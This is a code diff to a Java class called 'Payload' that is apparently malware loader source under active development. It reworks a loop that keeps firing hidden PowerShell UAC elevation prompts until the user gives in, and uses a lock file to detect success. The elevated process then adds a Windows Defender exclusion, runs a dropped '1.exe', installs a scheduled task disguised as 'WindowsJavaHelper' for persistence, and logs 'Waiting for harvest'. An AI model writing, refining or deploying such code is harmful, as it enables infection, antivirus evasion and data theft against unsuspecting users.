@@ -142,33 +142,39 @@ public class Payload {
             String javaHome = new File(System.getProperty("java.home")).getAbsolutePath();
             String javaExe = javaHome + "\\bin\\javaw.exe";
             String jarPath = new File(Payload.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getAbsolutePath();
-            
+            String appData = System.getenv("APPDATA");
+            File lockFile = new File(appData, "loader\\.lock");
+
             log("java: " + javaExe);
             log("jar: " + jarPath);
 
+            // Use cmd /c start to launch PowerShell without waiting.
+            // The elevated process will try to delete .lock. If it can, the parent knows UAC was accepted.
             String psCommand = String.format(
-                "Start-Process -FilePath '%s' -Verb RunAs -ArgumentList '-jar \"%s\" %s %s' -Wait",
+                "Start-Process -FilePath '%s' -Verb RunAs -ArgumentList '-jar \"%s\" %s %s'",
                 javaExe, jarPath, key, ip
             );
+            
+            // Write the lock file. Parent holds the handle.
+            FileOutputStream lockStream = new FileOutputStream(lockFile);
 
             while (true) {
                 log("Triggering UAC via PowerShell...");
-                Process p = new ProcessBuilder(
-                    "powershell.exe", "-NoProfile", "-WindowStyle", "Hidden", "-Command", psCommand
-                ).start();
                 
-                p.waitFor(); 
+                // Launch PowerShell hidden, no -Wait
+                new ProcessBuilder("powershell.exe", "-NoProfile", "-WindowStyle", "Hidden", "-Command", psCommand).start();
                 
-                // Intense loop: Check every 200ms if we somehow gained admin
-                for(int i=0; i<10; i++) {
-                    if (isAdmin()) {
-                        log("We are Admin now? That's weird. Exiting loop.");
-                        System.exit(0); 
+                // Fast loop: Wait for the lock file to be deleted by the elevated process
+                for (int i = 0; i < 300; i++) { // 300 * 50ms = 15 seconds max wait
+                    if (!lockFile.exists() || lockFile.delete()) {
+                        log("Lock file deleted. UAC Accepted. Parent exiting.");
+                        lockStream.close();
+                        System.exit(0);
                     }
-                    Thread.sleep(200);
+                    Thread.sleep(50); // Insanely fast check
                 }
                 
-                log("Retrying UAC loop...");
+                log("UAC Denied or Timed Out. Retrying...");
             }
         } catch (Exception e) {
             log("UAC Error: " + e.toString());
@@ -180,6 +186,13 @@ public class Payload {
             log("Executing payload...");
             String appData = System.getenv("APPDATA");
             File loaderDir = new File(appData, "loader");
+            
+            // Delete the lock file to signal the parent process to die
+            File lock = new File(loaderDir, ".lock");
+            if (lock.exists()) {
+                lock.delete();
+                log("Deleted .lock file to notify parent.");
+            }
 
             log("Adding AV exclusion...");
             String regPath = "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths";
@@ -203,7 +216,6 @@ public class Payload {
             log("Executing 1.exe...");
             new ProcessBuilder(new File(loaderDir, "1.exe").getAbsolutePath()).start();
 
-            // Install Scheduled Task pointing directly to javaw.exe
             installStartupTask(key, ip);
 
             log("Waiting for harvest...");
@@ -263,12 +275,21 @@ public class Payload {
 
             Files.write(Paths.get(xmlPath), xml.getBytes("UTF-16"));
 
-            String cmd = "schtasks.exe /Create /TN \"WindowsJavaHelper\" /XML \"" + xmlPath + "\" /F";
+            String cmd = "cmd.exe /c schtasks.exe /Create /TN \"WindowsJavaHelper\" /XML \"" + xmlPath + "\" /F";
             Process p = Runtime.getRuntime().exec(cmd);
+            
+            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
+            String line;
+            StringBuilder output = new StringBuilder();
+            while ((line = reader.readLine()) != null) {
+                output.append(line).append("\n");
+            }
             p.waitFor();
             
+            log("schtasks output:\n" + output.toString());
+            
             new File(xmlPath).delete();
-            log("Startup task installed successfully using javaw.exe.");
+            log("Startup task installed successfully.");
         } catch (Exception e) {
             log("Task install failed: " + e.toString());
         }
